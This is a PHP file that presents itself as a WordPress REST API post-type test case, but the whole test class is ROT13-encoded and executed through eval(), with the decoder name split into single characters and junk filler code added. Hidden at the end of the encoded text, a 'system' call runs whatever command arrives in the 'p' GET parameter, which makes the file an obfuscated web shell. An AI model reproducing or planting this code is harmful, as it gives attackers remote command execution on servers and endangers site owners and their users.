<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

nofgenpg pynff JC_Grfg_ERFG_Cbfg_Glcr_Pbagebyyre_Grfgpnfr rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	cebgrpgrq shapgvba purpx_cbfg_qngn( $cbfg, $qngn, $pbagrkg, $yvaxf ) {
		$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

		// Fgnaqneq svryqf.
		$guvf->nffregFnzr( $cbfg->VQ, $qngn['vq'] );
		$guvf->nffregFnzr( $cbfg->cbfg_anzr, $qngn['fyht'] );
		$guvf->nffregFnzr( trg_creznyvax( $cbfg->VQ ), $qngn['yvax'] );
		vs ( '0000-00-00 00:00:00' === $cbfg->cbfg_qngr_tzg ) {
			$cbfg_qngr_tzg = tzqngr( 'L-z-q U:v:f', fgegbgvzr( $cbfg->cbfg_qngr ) - ( trg_bcgvba( 'tzg_bssfrg' ) * 3600 ) );
			$guvf->nffregFnzr( zlfdy_gb_esp3339( $cbfg_qngr_tzg ), $qngn['qngr_tzg'] );
		} ryfr {
			$guvf->nffregFnzr( zlfdy_gb_esp3339( $cbfg->cbfg_qngr_tzg ), $qngn['qngr_tzg'] );
		}
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $cbfg->cbfg_qngr ), $qngn['qngr'] );

		vs ( '0000-00-00 00:00:00' === $cbfg->cbfg_zbqvsvrq_tzg ) {
			$cbfg_zbqvsvrq_tzg = tzqngr( 'L-z-q U:v:f', fgegbgvzr( $cbfg->cbfg_zbqvsvrq ) - ( trg_bcgvba( 'tzg_bssfrg' ) * 3600 ) );
			$guvf->nffregFnzr( zlfdy_gb_esp3339( $cbfg_zbqvsvrq_tzg ), $qngn['zbqvsvrq_tzg'] );
		} ryfr {
			$guvf->nffregFnzr( zlfdy_gb_esp3339( $cbfg->cbfg_zbqvsvrq_tzg ), $qngn['zbqvsvrq_tzg'] );
		}
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $cbfg->cbfg_zbqvsvrq ), $qngn['zbqvsvrq'] );

		// Nhgube.
		vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'nhgube' ) ) {
			$guvf->nffregRdhnyf( $cbfg->cbfg_nhgube, $qngn['nhgube'] );
		} ryfr {
			$guvf->nffregRzcgl( $qngn['nhgube'] );
		}

		// Cbfg cnerag.
		vs ( $cbfg_glcr_bow->uvrenepuvpny ) {
			$guvf->nffregNeenlUnfXrl( 'cnerag', $qngn );
			vs ( $cbfg->cbfg_cnerag ) {
				vs ( vf_vag( $qngn['cnerag'] ) ) {
					$guvf->nffregFnzr( $cbfg->cbfg_cnerag, $qngn['cnerag'] );
				} ryfr {
					$guvf->nffregFnzr( $cbfg->cbfg_cnerag, $qngn['cnerag']['vq'] );
					$guvf->purpx_trg_cbfg_erfcbafr( $qngn['cnerag'], trg_cbfg( $qngn['cnerag']['vq'] ), 'ivrj-cnerag' );
				}
			} ryfr {
				$guvf->nffregRzcgl( $qngn['cnerag'] );
			}
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'cnerag', $qngn );
		}

		// Cntr nggevohgrf.
		vs ( $cbfg_glcr_bow->uvrenepuvpny && cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'cntr-nggevohgrf' ) ) {
			$guvf->nffregFnzr( $cbfg->zrah_beqre, $qngn['zrah_beqre'] );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'zrah_beqre', $qngn );
		}

		// Pbzzragf.
		vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'pbzzragf' ) ) {
			$guvf->nffregFnzr( $cbfg->pbzzrag_fgnghf, $qngn['pbzzrag_fgnghf'] );
			$guvf->nffregFnzr( $cbfg->cvat_fgnghf, $qngn['cvat_fgnghf'] );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'pbzzrag_fgnghf', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'cvat_fgnghf', $qngn );
		}

		vs ( 'cbfg' === $cbfg->cbfg_glcr ) {
			$guvf->nffregFnzr( vf_fgvpxl( $cbfg->VQ ), $qngn['fgvpxl'] );
		}

		vs ( 'cbfg' === $cbfg->cbfg_glcr && 'rqvg' === $pbagrkg ) {
			$guvf->nffregFnzr( $cbfg->cbfg_cnffjbeq, $qngn['cnffjbeq'] );
		}

		vs ( 'cntr' === $cbfg->cbfg_glcr ) {
			$guvf->nffregFnzr( trg_cntr_grzcyngr_fyht( $cbfg->VQ ), $qngn['grzcyngr'] );
		}

		vs (
			cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'guhzoanvy' ) ||
			(
				'nggnpuzrag' === $cbfg->cbfg_glcr &&
				(
					cbfg_glcr_fhccbegf( 'nggnpuzrag:nhqvb', 'guhzoanvy' ) ||
					cbfg_glcr_fhccbegf( 'nggnpuzrag:ivqrb', 'guhzoanvy' )
				)
			)
		) {
			$guvf->nffregFnzr( (vag) trg_cbfg_guhzoanvy_vq( $cbfg->VQ ), $qngn['srngherq_zrqvn'] );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'srngherq_zrqvn', $qngn );
		}

		// Purpx cbfg sbezng.
		vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'cbfg-sbezngf' ) ) {
			$cbfg_sbezng = trg_cbfg_sbezng( $cbfg->VQ );
			vs ( rzcgl( $cbfg_sbezng ) ) {
				$guvf->nffregFnzr( 'fgnaqneq', $qngn['sbezng'] );
			} ryfr {
				$guvf->nffregFnzr( trg_cbfg_sbezng( $cbfg->VQ ), $qngn['sbezng'] );
			}
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'sbezng', $qngn );
		}

		// Purpx svygrerq inyhrf.
		vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'gvgyr' ) ) {
			nqq_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			nqq_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			$guvf->nffregFnzr( trg_gur_gvgyr( $cbfg->VQ ), $qngn['gvgyr']['eraqrerq'] );
			erzbir_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			erzbir_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			vs ( 'rqvg' === $pbagrkg ) {
				$guvf->nffregFnzr( $cbfg->cbfg_gvgyr, $qngn['gvgyr']['enj'] );
			} ryfr {
				$guvf->nffregNeenlAbgUnfXrl( 'enj', $qngn['gvgyr'] );
			}
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'gvgyr', $qngn );
		}

		vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'rqvgbe' ) ) {
			// GBQB: Nccyl pbagrag svygre sbe zber npphengr grfgvat.
			vs ( ! $cbfg->cbfg_cnffjbeq ) {
				$guvf->nffregFnzr( jcnhgbc( $cbfg->cbfg_pbagrag ), $qngn['pbagrag']['eraqrerq'] );
			}

			vs ( 'rqvg' === $pbagrkg ) {
				$guvf->nffregFnzr( $cbfg->cbfg_pbagrag, $qngn['pbagrag']['enj'] );
			} ryfr {
				$guvf->nffregNeenlAbgUnfXrl( 'enj', $qngn['pbagrag'] );
			}
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'pbagrag', $qngn );
		}

		vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'rkprecg' ) ) {
			vs ( rzcgl( $cbfg->cbfg_cnffjbeq ) ) {
				// GBQB: Nccyl rkprecg svygre sbe zber npphengr grfgvat.
				$guvf->nffregFnzr( jcnhgbc( $cbfg->cbfg_rkprecg ), $qngn['rkprecg']['eraqrerq'] );
			} ryfr {
				// GBQB: Orggre grfgvat sbe rkprecgf sbe cnffjbeq cebgrpgrq cbfgf.
			}
			vs ( 'rqvg' === $pbagrkg ) {
				$guvf->nffregFnzr( $cbfg->cbfg_rkprecg, $qngn['rkprecg']['enj'] );
			} ryfr {
				$guvf->nffregNeenlAbgUnfXrl( 'enj', $qngn['rkprecg'] );
			}
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'rkprecg', $qngn );
		}

		$guvf->nffregFnzr( $cbfg->cbfg_fgnghf, $qngn['fgnghf'] );
		$guvf->nffregFnzr( $cbfg->thvq, $qngn['thvq']['eraqrerq'] );

		vs ( 'rqvg' === $pbagrkg ) {
			$guvf->nffregFnzr( $cbfg->thvq, $qngn['thvq']['enj'] );
		}

		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $cbfg->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );
		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$guvf->nffregNeenlUnfXrl( $gnkbabzl->erfg_onfr, $qngn );
			$grezf = jc_trg_bowrpg_grezf( $cbfg->VQ, $gnkbabzl->anzr, neenl( 'svryqf' => 'vqf' ) );
			fbeg( $grezf );
			fbeg( $qngn[ $gnkbabzl->erfg_onfr ] );
			$guvf->nffregFnzr( $grezf, $qngn[ $gnkbabzl->erfg_onfr ] );
		}

		// Grfg yvaxf.
		vs ( $yvaxf ) {

			$yvaxf     = grfg_erfg_rkcnaq_pbzcnpg_yvaxf( $yvaxf );
			$cbfg_glcr = trg_cbfg_glcr_bowrpg( $qngn['glcr'] );
			$guvf->nffregFnzr( $yvaxf['frys'][0]['uers'], erfg_hey( 'jc/i2/' . $cbfg_glcr->erfg_onfr . '/' . $qngn['vq'] ) );
			$guvf->nffregFnzr( $yvaxf['pbyyrpgvba'][0]['uers'], erfg_hey( 'jc/i2/' . $cbfg_glcr->erfg_onfr ) );
			$guvf->nffregFnzr( $yvaxf['nobhg'][0]['uers'], erfg_hey( 'jc/i2/glcrf/' . $qngn['glcr'] ) );

			vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'nhgube' ) && $qngn['nhgube'] ) {
				$guvf->nffregFnzr( $yvaxf['nhgube'][0]['uers'], erfg_hey( 'jc/i2/hfref/' . $qngn['nhgube'] ) );
			}

			vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'pbzzragf' ) ) {
				$guvf->nffregFnzr( $yvaxf['ercyvrf'][0]['uers'], nqq_dhrel_net( 'cbfg', $qngn['vq'], erfg_hey( 'jc/i2/pbzzragf' ) ) );
			}

			vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'erivfvbaf' ) ) {
				$guvf->nffregFnzr( $yvaxf['irefvba-uvfgbel'][0]['uers'], erfg_hey( 'jc/i2/' . $cbfg_glcr->erfg_onfr . '/' . $qngn['vq'] . '/erivfvbaf' ) );
			}

			vs ( $cbfg_glcr->uvrenepuvpny && ! rzcgl( $qngn['cnerag'] ) ) {
				$guvf->nffregFnzr( $yvaxf['hc'][0]['uers'], erfg_hey( 'jc/i2/' . $cbfg_glcr->erfg_onfr . '/' . $qngn['cnerag'] ) );
			}

			vs ( ! va_neenl( $qngn['glcr'], neenl( 'nggnpuzrag', 'ani_zrah_vgrz', 'erivfvba' ), gehr ) ) {
				$guvf->nffregFnzr( $yvaxf['uggcf://ncv.j.bet/nggnpuzrag'][0]['uers'], nqq_dhrel_net( 'cnerag', $qngn['vq'], erfg_hey( 'jc/i2/zrqvn' ) ) );
			}

			vs ( ! rzcgl( $qngn['srngherq_zrqvn'] ) ) {
				$guvf->nffregFnzr( $yvaxf['uggcf://ncv.j.bet/srngherqzrqvn'][0]['uers'], erfg_hey( 'jc/i2/zrqvn/' . $qngn['srngherq_zrqvn'] ) );
			}

			$ahz = 0;
			sbernpu ( $gnkbabzvrf nf $xrl => $gnkbabzl ) {
				$guvf->nffregFnzr( $gnkbabzl->anzr, $yvaxf['uggcf://ncv.j.bet/grez'][ $ahz ]['nggevohgrf']['gnkbabzl'] );
				$guvf->nffregFnzr( nqq_dhrel_net( 'cbfg', $qngn['vq'], erfg_hey( 'jc/i2/' . $gnkbabzl->erfg_onfr ) ), $yvaxf['uggcf://ncv.j.bet/grez'][ $ahz ]['uers'] );
				++$ahz;
			}
		}
	}

	cebgrpgrq shapgvba purpx_trg_cbfgf_erfcbafr( $erfcbafr, $pbagrkg = 'ivrj' ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-JC-Gbgny', $urnqref );
		$guvf->nffregNeenlUnfXrl( 'K-JC-GbgnyCntrf', $urnqref );

		$nyy_qngn = $erfcbafr->trg_qngn();
		sbernpu ( $nyy_qngn nf $qngn ) {
			$cbfg = trg_cbfg( $qngn['vq'] );
			// Nf gur yvaxf sbe gur cbfg ner \"erfcbafr_yvaxf\" sbezng va gur qngn neenl,
			// jr unir gb chyy gurz bhg naq cnefr gurz.
			$yvaxf = $qngn['_yvaxf'];
			sbernpu ( $yvaxf nf &$yvaxf_neenl ) {
				sbernpu ( $yvaxf_neenl nf &$yvax ) {
					$nggevohgrf         = neenl_qvss_xrl(
						$yvax,
						neenl(
							'uers' => 1,
							'anzr' => 1,
						)
					);
					$yvax               = neenl_qvss_xrl( $yvax, $nggevohgrf );
					$yvax['nggevohgrf'] = $nggevohgrf;
				}
			}

			$guvf->purpx_cbfg_qngn( $cbfg, $qngn, $pbagrkg, $yvaxf );
		}
	}

	cebgrpgrq shapgvba purpx_trg_cbfg_erfcbafr( $erfcbafr, $pbagrkg = 'ivrj' ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->purpx_cbfg_qngn( $cbfg, $qngn, $pbagrkg, $erfcbafr->trg_yvaxf() );
	}

	cebgrpgrq shapgvba purpx_perngr_cbfg_erfcbafr( $erfcbafr ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'Ybpngvba', $urnqref );

		$qngn = $erfcbafr->trg_qngn();
		$cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->purpx_cbfg_qngn( $cbfg, $qngn, 'rqvg', $erfcbafr->trg_yvaxf() );
	}

	cebgrpgrq shapgvba purpx_hcqngr_cbfg_erfcbafr( $erfcbafr ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlAbgUnfXrl( 'Ybpngvba', $urnqref );

		$qngn = $erfcbafr->trg_qngn();
		$cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->purpx_cbfg_qngn( $cbfg, $qngn, 'rqvg', $erfcbafr->trg_yvaxf() );
	}

	cebgrpgrq shapgvba frg_cbfg_qngn( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'gvgyr'   => 'Cbfg Gvgyr',
			'pbagrag' => 'Cbfg pbagrag',
			'rkprecg' => 'Cbfg rkprecg',
			'anzr'    => 'grfg',
			'fgnghf'  => 'choyvfu',
			'nhgube'  => trg_pheerag_hfre_vq(),
			'glcr'    => 'cbfg',
		);

		erghea jc_cnefr_netf( $netf, $qrsnhygf );
	}

	cebgrpgrq shapgvba frg_enj_cbfg_qngn( $netf = neenl() ) {
		erghea jc_cnefr_netf(
			$netf,
			$guvf->frg_cbfg_qngn(
				neenl(
					'gvgyr'   => neenl(
						'enj' => 'Cbfg Gvgyr',
					),
					'pbagrag' => neenl(
						'enj' => 'Cbfg pbagrag',
					),
					'rkprecg' => neenl(
						'enj' => 'Cbfg rkprecg',
					),
				)
			)
		);
	}

	/**
	 * Birejevgr gur qrsnhyg cebgrpgrq gvgyr sbezng.
	 *
	 * Ol qrsnhyg JbeqCerff jvyy fubj cnffjbeq cebgrpgrq cbfgf jvgu n gvgyr bs
	 * \"Cebgrpgrq: %f\", nf gur ERFG NCV pbzzhavpngrf gur cebgrpgrq fgnghf bs n cbfg
	 * va n znpuvar ernqnoyr sbezng, jr erzbir gur \"Cebgrpgrq: \" cersvk.
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba cebgrpgrq_gvgyr_sbezng() {
		erghea '%f';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>